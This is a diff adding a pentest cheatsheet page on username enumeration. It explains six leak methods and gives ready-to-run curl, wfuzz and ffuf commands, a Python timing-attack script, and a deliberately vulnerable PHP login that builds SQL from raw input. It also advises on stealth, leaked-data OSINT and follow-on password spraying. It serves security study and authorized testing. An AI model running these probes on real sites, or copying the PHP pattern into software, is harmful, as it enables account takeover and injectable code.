@@ -1,0 +1,235 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Username enumeration · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › Authentication &amp; Sessions</nav><h1>Username enumeration</h1><p class="cx-lede">Distinguishing valid from invalid users through response differences, timing, reset forms, registration forms, and predictable naming patterns.</p><div class="cx-tags"><span class="cx-tag">MITRE T1589.002, T1078</span><span class="cx-tag">D3FEND D3-AH</span><span class="cx-tag">IMPACT CredentialTheft</span><span class="cx-tag">OWASP A07</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Five places an application leaks "this user exists":</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Login error message differs
+&quot;Unknown username&quot;  vs.  &quot;Invalid password for user X&quot;
+
+# 2. Form prefill on submit (sticky field for valid users only)
+&lt;input name=&quot;user&quot; value=&quot;admin&quot;&gt;    # form preserves valid usernames
+&lt;input name=&quot;user&quot; value=&quot;&quot;&gt;          # form clears unknown usernames
+
+# 3. Response timing differs (password hashing only runs for valid users)
+admin     → 263ms       guest     → 5ms
+nonexistent → 3ms       randomXXX → 4ms
+
+# 4. Password-reset flow differs
+&quot;Email sent to admin@example.com&quot;  vs.  &quot;Username not found&quot;
+
+# 5. Registration form rejects taken names
+&quot;That username is already in use&quot; → that username exists</code></pre></figure>
+<p>Success indicator: one or more usernames confirmed valid, ready to target with brute-force or password spraying.</p>
+<h2 id="why-bother">Why bother</h2>
+<p>Username enumeration is the cheap prerequisite to almost everything else in this section. Once you have a list of valid usernames:</p>
+<ul>
+<li>Targeted brute-force (<a href="../password-policy/index.html">Password policy</a>) becomes feasible on just those users</li>
+<li>Password spraying (one common password, many users) becomes precise</li>
+<li>Reset-token attacks (<a href="../reset-tokens/index.html">Reset tokens</a>) need a username to start</li>
+<li>Username injection (<a href="../username-injection/index.html">Username injection</a>) needs a target user</li>
+<li>OSINT and phishing have a target list</li>
+</ul>
+<p>Most defenses are pitched at "preventing the brute-force." The username-enumeration leak almost always comes free with whatever defense isn't.</p>
+<h2 id="method-1-user-unknown-error-message">Method 1 - User-unknown error message</h2>
+<p>The classic. Application replies differently for "user doesn't exist" vs. "user exists but wrong password."</p>
+<h3 id="detection">Detection</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Submit with a definitely-fake user and an obviously-wrong password
+curl -s -X POST -d &quot;user=zzzzzzzz9999&amp;pass=wrong&quot; https://&lt;TARGET&gt;/login &gt; /tmp/r-unknown
+
+# Submit with a probable user (admin) and an obviously-wrong password
+curl -s -X POST -d &quot;user=admin&amp;pass=wrong&quot; https://&lt;TARGET&gt;/login &gt; /tmp/r-admin
+
+# Diff
+diff /tmp/r-unknown /tmp/r-admin</code></pre></figure>
+<p>Differences to look for:
+- Error message text ("Unknown username" / "Incorrect password")
+- Number of error elements (one error block vs. two)
+- HTTP status code (rare but happens - 401 for known user, 404 for unknown)
+- Set-Cookie header (some apps set a "failed attempt" cookie only for valid users)</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>Once a divergence is identified, brute-force the username list against the divergence signal:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># wfuzz hiding the &quot;Unknown username&quot; response
+wfuzz -c -z file,/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt \
+      -d &quot;Username=FUZZ&amp;Password=dummypass&quot; \
+      --hs &quot;Unknown username&quot; \
+      https://&lt;TARGET&gt;/login.php</code></pre></figure>
+<p>The <code>--hs</code> filter hides any response matching the "user not found" message. Everything that survives the filter is a valid username.</p>
+<p><code>ffuf</code> equivalent:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">ffuf -w /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt:UNAME \
+     -u https://&lt;TARGET&gt;/login.php \
+     -X POST -d &quot;Username=UNAME&amp;Password=dummypass&quot; \
+     -fr &quot;Unknown username&quot;</code></pre></figure>
+<h2 id="method-2-form-prefill-inference">Method 2 - Form prefill inference</h2>
+<p>Some applications return the login page with the submitted username preserved in the form field - but only if the username is valid:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!-- After submitting an existing username with wrong password --&gt;
+&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;admin&quot;&gt;
+
+&lt;!-- After submitting an unknown username --&gt;
+&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot;&gt;</code></pre></figure>
+<p>This pattern appears most often in:
+- Mobile-optimized login pages (developers prioritized UX over leak prevention)
+- Old WordPress versions (<a href="https://core.trac.wordpress.org/ticket/3708">WP ticket #3708</a> - preserved by design)
+- Custom apps with helpful UX</p>
+<h3 id="detection_1">Detection</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Check whether the username gets echoed in the form
+curl -s -X POST -d &quot;user=admin&amp;pass=wrong&quot; https://&lt;TARGET&gt;/login | grep -E &#x27;name=&quot;user&quot;&#x27;
+curl -s -X POST -d &quot;user=nonexistent&amp;pass=wrong&quot; https://&lt;TARGET&gt;/login | grep -E &#x27;name=&quot;user&quot;&#x27;
+
+# If first prints value=&quot;admin&quot; and second prints value=&quot;&quot; → enumeration available</code></pre></figure>
+<h3 id="exploitation_1">Exploitation</h3>
+<p>Filter on whether the response contains the submitted username:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># ffuf - only match responses where the submitted username appears in a value=&quot;...&quot; field
+ffuf -w usernames.txt:UNAME \
+     -u https://&lt;TARGET&gt;/login \
+     -X POST -d &quot;user=UNAME&amp;pass=wrong&quot; \
+     -mr &#x27;value=&quot;UNAME&quot;&#x27;                    # regex match in response</code></pre></figure>
+<p>Note: some applications echo the submitted value regardless (for any UX reason), but with a marker indicating validity. Look for hidden fields, error class names, or input-error states - those distinguish valid from invalid where the value alone doesn't.</p>
+<p>A real example pattern from custom apps: the page source contains either:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;input type=&quot;hidden&quot; name=&quot;wronguser&quot; value=&quot;admin&quot;&gt;</code></pre></figure>
+<p>…for invalid usernames (the app marks the attempt as a wrong username), or:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;input type=&quot;hidden&quot; name=&quot;validuser&quot; value=&quot;admin&quot;&gt;</code></pre></figure>
+<p>…for valid usernames (the app marks the attempt as a wrong password against a known user). Filtering on <code>wronguser</code> vs. <code>validuser</code> enumerates the valid set.</p>
+<h3 id="cookie-based-inference">Cookie-based inference</h3>
+<p>A subtler variant - the application sets a different cookie based on validity:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Valid username → cookie &#x27;failed_login_count&#x27; increments
+# Invalid username → no cookie set
+
+curl -s -c - -X POST -d &quot;user=admin&amp;pass=wrong&quot; https://&lt;TARGET&gt;/login | grep -i Set-Cookie
+curl -s -c - -X POST -d &quot;user=nonexistent&amp;pass=wrong&quot; https://&lt;TARGET&gt;/login | grep -i Set-Cookie</code></pre></figure>
+<p>If the cookie set differs, that's a signal - fuzz on Set-Cookie presence instead of response body.</p>
+<h2 id="method-3-timing-attacks">Method 3 - Timing attacks</h2>
+<p>When the application hashes the submitted password before comparison, valid users incur the hashing cost - invalid users don't (no password to hash against). The difference is observable.</p>
+<p>Vulnerable pattern (the <code>$result</code> from the user lookup gates whether hashing runs):</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">$result = $db-&gt;query(&#x27;SELECT * FROM users WHERE username=&quot;&#x27;.$user.&#x27;&quot;&#x27;);
+if ($result) {
+    $row = mysqli_fetch_row($result);
+    $cpass = hash_password($_POST[&#x27;password&#x27;]);   // ← only runs for valid users
+    if ($cpass === $row[&#x27;cpassword&#x27;]) { /* logged in */ }
+    else                              { /* invalid credentials */ }
+} else {
+    /* invalid credentials */                     // ← no hashing for invalid user
+}</code></pre></figure>
+<h3 id="detection_2">Detection</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Time a definitely-valid user (something obvious like admin or root)
+time curl -s -X POST -d &quot;user=admin&amp;pass=$(date +%s%N)&quot; https://&lt;TARGET&gt;/login &gt; /dev/null
+
+# Time a definitely-invalid user
+time curl -s -X POST -d &quot;user=zzzzzzz9999&amp;pass=$(date +%s%N)&quot; https://&lt;TARGET&gt;/login &gt; /dev/null</code></pre></figure>
+<p>If the first takes consistently longer (50-500ms more, depending on the hashing algorithm), the application is leaking through timing.</p>
+<h3 id="exploitation_2">Exploitation</h3>
+<p>Time every candidate username and pick the outliers:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">import requests, time
+
+URL = &quot;https://target.example.com/login&quot;
+
+for username in open(&#x27;/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt&#x27;):
+    username = username.strip()
+    times = []
+    for _ in range(5):                          # average 5 attempts to defeat jitter
+        start = time.time()
+        requests.post(URL, data={&#x27;user&#x27;: username, &#x27;pass&#x27;: &#x27;wrong&#x27;})
+        times.append(time.time() - start)
+    avg = sum(times) / len(times)
+    print(f&quot;{username:20s} {avg:.3f}&quot;)</code></pre></figure>
+<p>Look for the outliers. With bcrypt-grade hashing, valid users typically take 200-300ms while invalid users take 1-5ms - the gap is unmistakable. With faster algorithms (SHA1, MD5) the gap might be sub-millisecond and easily lost to network jitter; in that case, average many more samples and accept that some candidates will produce false positives.</p>
+<p>Sample output against a vulnerable app:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>admin                 0.263
+root                  0.003
+test                  0.005
+guest                 0.003
+info                  0.001
+mysql                 0.001
+oracle                0.001</code></pre></figure>
+<p><code>admin</code> is the only outlier - clearly valid.</p>
+<h3 id="defeating-timing-attack-noise">Defeating timing attack noise</h3>
+<p>Network jitter, server CPU load, and HTTPS-handshake variation all add noise. Practical mitigations on the attacker side:
+- Average many samples (5-20 per candidate)
+- Filter outliers (drop top/bottom 10% before averaging)
+- Test from a host with low network latency to the target
+- Run during off-peak hours</p>
+<p>If the gap is comparable to the noise floor, the application is probably using fast hashing (MD5/SHA1) without significant computation - timing enumeration still works but needs much larger sample sizes.</p>
+<h2 id="method-4-password-reset-leakage">Method 4 - Password reset leakage</h2>
+<p>Reset forms are often less protected than login forms - they hand over information to "help" the user:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&quot;An email has been sent to your address&quot;         (valid user - message would actually be sent)
+&quot;That username is not registered&quot;                (invalid user)</code></pre></figure>
+<p>Same response-diffing approach works:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">ffuf -w usernames.txt:UNAME \
+     -u https://&lt;TARGET&gt;/forgot-password \
+     -X POST -d &quot;user=UNAME&quot; \
+     -fr &quot;not registered&quot;</code></pre></figure>
+<p><strong>The cost of this attack</strong>: actual reset emails get sent to actual users. Some users will notice and contact support. Use sparingly during stealth-required engagements; freely during loud engagements where the customer expects activity.</p>
+<h3 id="hardened-reset-forms">Hardened reset forms</h3>
+<p>A reset form that always returns the same response regardless of username validity defeats this attack:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&quot;If that username is registered, you will receive an email&quot;     (no matter what)</code></pre></figure>
+<p>When you see this generic message, the reset path likely doesn't enumerate - pivot to another method.</p>
+<h2 id="method-5-registration-form">Method 5 - Registration form</h2>
+<p>Self-registration almost always tells you when a username is taken:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&quot;Sorry, that username is already in use. Choose another.&quot;</code></pre></figure>
+<p>The registration form is also usually less protected than login (developers expect higher legitimate volume of registration attempts than login failures).</p>
+<h3 id="exploitation_3">Exploitation</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">ffuf -w admin-usernames.txt:UNAME \
+     -u https://&lt;TARGET&gt;/register \
+     -X POST -d &quot;user=UNAME&amp;email=test@example.com&amp;pass=AnythingValid1!&quot; \
+     -mr &quot;already in use&quot;                       # match responses indicating the user exists</code></pre></figure>
+<p>This approach has two costs:
+1. Loud - every attempt is a registration request, often visible to admins
+2. Creates accounts - even unsuccessful attempts may leave records</p>
+<h3 id="sub-addressing-for-unlimited-registrations">Sub-addressing for unlimited registrations</h3>
+<p>Email sub-addressing (RFC 5233) lets you register many accounts with one mailbox:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>attacker@example.com
+attacker+test1@example.com           ← delivered to attacker@example.com
+attacker+test2@example.com           ← delivered to attacker@example.com
+attacker+xxxxx@example.com           ← delivered to attacker@example.com</code></pre></figure>
+<p>When the registration form accepts these (most do - sub-addressing is RFC-compliant), you can spin up arbitrary accounts during testing.</p>
+<h2 id="method-6-predictable-usernames">Method 6 - Predictable usernames</h2>
+<p>When usernames follow a pattern, enumerate the pattern instead of dictionary-attacking:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>user1000, user1001, user1002, ...        # sequential
+emp001, emp002, emp003, ...
+john.smith, jane.doe                     # first.last from a company directory
+support.us, support.eu, support.asia     # role-region pattern
+admin.gr, admin.it, admin.us             # role-countrycode pattern</code></pre></figure>
+<p>Once you've identified one or two valid usernames through any other method, look for the pattern. If <code>support.us</code> exists, try <code>support.uk</code>, <code>support.de</code>, <code>support.fr</code>. If <code>emp001</code> exists, try <code>emp002</code> through <code>emp999</code>.</p>
+<h3 id="generating-predictable-patterns">Generating predictable patterns</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Sequential
+seq -f &#x27;user%04g&#x27; 1 9999 &gt; /tmp/sequential.txt
+
+# Common role-country patterns
+roles=&quot;admin support helpdesk tech ops&quot;
+countries=&quot;us uk de fr es it gr cn jp&quot;
+for r in $roles; do for c in $countries; do echo &quot;$r.$c&quot;; done; done &gt; /tmp/role-country.txt
+
+# Then fuzz the generated list
+ffuf -w /tmp/role-country.txt:UNAME \
+     -u https://&lt;TARGET&gt;/messages?to=UNAME \
+     -mr &quot;user not found&quot; -fmode and</code></pre></figure>
+<p>A message-send feature is sometimes a better enumeration channel than the login itself - "user not found" responses are explicit and unrelated to authentication, so they often skip authentication-style rate-limiting.</p>
+<h2 id="combining-signals">Combining signals</h2>
+<p>A real engagement usually mixes methods. Typical chain:</p>
+<ol>
+<li>Test login error response - gives 0 or 1 explicit leaks</li>
+<li>If no explicit leak, test timing - usually finds 1-3 candidates</li>
+<li>Confirm candidates via password-reset or message-send features</li>
+<li>Identify pattern from confirmed candidates</li>
+<li>Generate pattern-based list, enumerate the rest</li>
+</ol>
+<p>The capstone-style chain from authentication training: "Support page mentions a 'support' user and other accounts by country code" → use the message-send feature to test <code>support.us</code>, <code>support.uk</code>, etc. → confirm valid ones → expand to <code>admin.us</code>, <code>admin.uk</code>, etc. on the same pattern.</p>
+<h2 id="detection-only-payloads">Detection-only payloads</h2>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Simple side-by-side comparison without committing to a full enumeration
+curl -s -X POST -d &quot;user=admin&amp;pass=wrong&quot; https://&lt;TARGET&gt;/login | md5sum
+curl -s -X POST -d &quot;user=zzzzzz&amp;pass=wrong&quot; https://&lt;TARGET&gt;/login | md5sum
+# Different MD5 = differing response = enumeration available</code></pre></figure>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong>Hardened applications return identical responses for valid and invalid users.</strong> Identical text, identical timing, identical cookies. When this is genuinely the case, enumeration is closed at this path - pivot to other paths.</li>
+<li><strong>The cleanest detection-time signal is response equality.</strong> Generate a few requests with known-fake and known-real (admin, root, your own account) and <code>diff</code> the responses. If they're identical bit-for-bit, enumeration through this endpoint is closed.</li>
+<li><strong>Username enumeration is a CWE-203 issue (Observable Discrepancy).</strong> OWASP doesn't separately enumerate username enumeration but folds it into A07 (Identification and Authentication Failures). Some bug bounty programs reject enumeration as low-severity; others reward it as an information disclosure.</li>
+<li><strong>OSINT supplements enumeration.</strong> Company employee names from LinkedIn, GitHub profiles, leaked databases. Combine with the application's username scheme (firstname.lastname, firstinitiallastname, etc.) for a high-quality targeted list before hitting the application at all.</li>
+</ul>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>Once you have valid usernames, the best next move depends on what's possible: targeted brute-force if password policy is weak (see <a href="../password-policy/index.html">Password policy</a>), password spraying with common passwords if multi-account access is the goal, or <a href="../reset-tokens/index.html">reset tokens</a> if you can bypass the password phase entirely.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../bruteforce-protections/index.html">Previous: Bruteforce protections</a><a class="cx-next" href="../password-policy/index.html">Next: Password policy inference</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
